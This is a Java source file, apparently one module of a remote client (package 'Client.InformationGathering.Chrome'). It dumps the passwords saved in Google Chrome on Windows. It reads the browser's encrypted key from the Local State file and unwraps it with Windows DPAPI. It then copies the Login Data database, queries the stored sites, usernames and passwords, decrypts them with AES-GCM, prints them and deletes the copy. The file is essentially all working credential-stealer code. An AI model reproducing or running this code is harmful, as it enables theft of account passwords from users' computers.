package Client.InformationGathering.Chrome;

import com.sun.jna.platform.win32.Crypt32Util;
import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.*;
import java.util.Arrays;
import java.util.Base64;


public class DumpChromePasswords {

    private JSONObject jsonObject;

    private byte[] getEncryptionKey() {
        try {
            JSONObject json = new JSONObject(Files.readString(Path.of(System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")));
            String key = json.getJSONObject("os_crypt").getString("encrypted_key");
            byte[] decodedKey = Base64.getDecoder().decode(key.getBytes(StandardCharsets.UTF_8));
            byte[] reducedBytes = Arrays.copyOfRange(decodedKey, 5, decodedKey.length);
            return Crypt32Util.cryptUnprotectData(reducedBytes);
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    private String decryptPassword(byte[] password, byte[] encryptionKey) {
        byte[] nonce = Arrays.copyOfRange(password, 3, 3 + 12);
        byte[] ciphertextTag = Arrays.copyOfRange(password, 3 + 12, password.length);
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
            SecretKeySpec keySpec = new SecretKeySpec(encryptionKey, "AES");
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
            byte[] bytesPassword = cipher.doFinal(ciphertextTag);
            return new String(bytesPassword, StandardCharsets.UTF_8);
        } catch (InvalidAlgorithmParameterException | NoSuchPaddingException | IllegalBlockSizeException | NoSuchAlgorithmException | BadPaddingException | InvalidKeyException e) {
            e.printStackTrace();
            return null;
        }
    }

    public JSONObject generateJSON() {
        byte[] encryptionKey = getEncryptionKey();
        try {
            FileUtils.copyFileToDirectory(new File(System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), new File(System.getProperty("user.dir")));
        } catch (IOException e) {
            e.printStackTrace();
        }
        File db = new File("Login Data");
        String url = "jdbc:sqlite:" + db;
        try {
            Connection conn = DriverManager.getConnection(url);
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(" select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used");
            System.out.println("Established");
            while (rs.next()) {
                String originUrl = rs.getString("origin_url");
                String actionUrl = rs.getString("action_url");
                String username = rs.getString("username_value");
                String password = decryptPassword(rs.getBytes("password_value"), encryptionKey);

                System.out.println(originUrl);
                System.out.println(actionUrl);
                System.out.println(username);
                System.out.println(password);
            }
            rs.close();
            stmt.close();
            conn.close();
            FileUtils.delete(db);
        } catch (IOException | SQLException e) {
            e.printStackTrace();
        }
        return null;
    }
}